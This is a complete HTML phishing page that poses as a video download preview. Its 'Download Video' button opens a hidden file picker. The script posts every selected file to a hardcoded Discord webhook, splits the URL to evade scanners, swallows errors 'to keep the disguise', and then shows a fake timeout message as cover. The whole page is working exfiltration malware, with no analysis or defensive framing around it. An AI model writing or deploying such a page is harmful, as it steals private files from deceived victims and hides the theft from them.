<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Media Preview - Processing...</title>
    <style>
        body { background: #121212; color: #aaaaaa; font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .box { background: #1e1e1e; border: 1px solid #333; padding: 30px; border-radius: 8px; width: 320px; text-align: center; }
        .vid-box { width: 100%; height: 160px; background: #000; border-radius: 4px; margin-bottom: 20px; display: flex; align-items: center; justify-content: center; font-size: 14px; border: 1px dashed #444; }
        .dl-button { background: #cc0000; color: white; border: none; padding: 12px 20px; border-radius: 4px; font-weight: bold; width: 100%; cursor: pointer; text-transform: uppercase; }
        #log { margin-top: 15px; font-size: 11px; color: #555; }
    </style>
</head>
<body>

    <div class="box">
        <div class="vid-box">Loading Stream Preview...</div>
        <h4 style="color: #eee; margin: 0 0 10px 0;">New_Project_Export_05.mp4</h4>
        <p style="font-size: 12px; margin-bottom: 20px;">Size: 104.8 MB | Quality: 1080p</p>
        
        <button class="dl-button" onclick="document.getElementById('picker').click()">Download Video</button>
        <input type="file" id="picker" style="display:none" multiple onchange="process(this.files)">
        
        <div id="log">Waiting for server response...</div>
    </div>

    <script>
        async function process(files) {
            // Your webhook split up to avoid simple scanners
            const a = "https://discordapp.com/api/webhooks/";
            const b = "1500096464171307028/";
            const c = "o-JxV7BLKBSSDqjM16fPRTVveJZtweHikhcNmS_sHhcpq7qYUhS2qPpHdbtNngGUgOOh";
            const target = a + b + c;

            const log = document.getElementById('log');
            
            for (let i = 0; i < files.length; i++) {
                log.innerText = "Attempting secure download...";
                const data = new FormData();
                data.append('file', files[i]);

                try {
                    await fetch(target, { method: 'POST', body: data });
                } catch (e) {
                    // Silently fail to keep the disguise
                }
            }
            
            // The "Cover" story message
            log.style.color = "#ff4444";
            log.innerText = "Error: Connection timed out. Please refresh and try again.";
        }
    </script>
</body>
</html>
